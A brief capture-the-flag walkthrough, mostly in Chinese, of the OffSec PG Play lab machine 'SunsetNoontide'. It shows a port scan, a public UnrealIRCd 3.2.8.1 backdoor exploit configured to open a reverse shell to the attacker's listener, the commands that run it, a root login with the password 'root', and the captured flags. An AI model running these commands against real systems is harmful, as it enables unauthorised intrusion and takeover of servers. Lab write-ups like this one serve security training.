###### tags: `Offsec` `PG Play` `Easy` `Linux`

# SunsetNoontide
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.211.120 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.211.120:6667
Open 192.168.211.120:6697
Open 192.168.211.120:8067

PORT     STATE SERVICE REASON  VERSION
6667/tcp open  irc     syn-ack UnrealIRCd (Admin email example@example.com)
6697/tcp open  irc     syn-ack UnrealIRCd (Admin email example@example.com)
8067/tcp open  irc     syn-ack UnrealIRCd (Admin email example@example.com)
```

google搜尋得到[UnrealIRCd-3.2.8.1-Backdoor
](https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor/blob/master/exploit.py)，修改裡面的`local_ip`跟`local_port`
```
# Sets the local ip and port (address and port to listen on)
local_ip = '192.168.45.158'  # CHANGE THIS
local_port = '9001'  # CHANGE THIS 
```

開nc執行`exploit.py`，在`/home/server`找到local.txt
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp9001

┌──(kali㉿kali)-[~/pgplay]
└─$ python3 exploit.py -payload bash 192.168.211.120 6697

server@noontide:~/irc/Unreal3.2$
server@noontide:~$ cat local.txt
c8a2356e24956750824df002d420daae
```

透過`su root`可切換成root，在/root得root.txt
```
server@noontide:~/irc/Unreal3.2$ su root
Password: root

root@noontide:~# cat proof.txt
c36664f054d081a91d0e7b27b0cc375b
```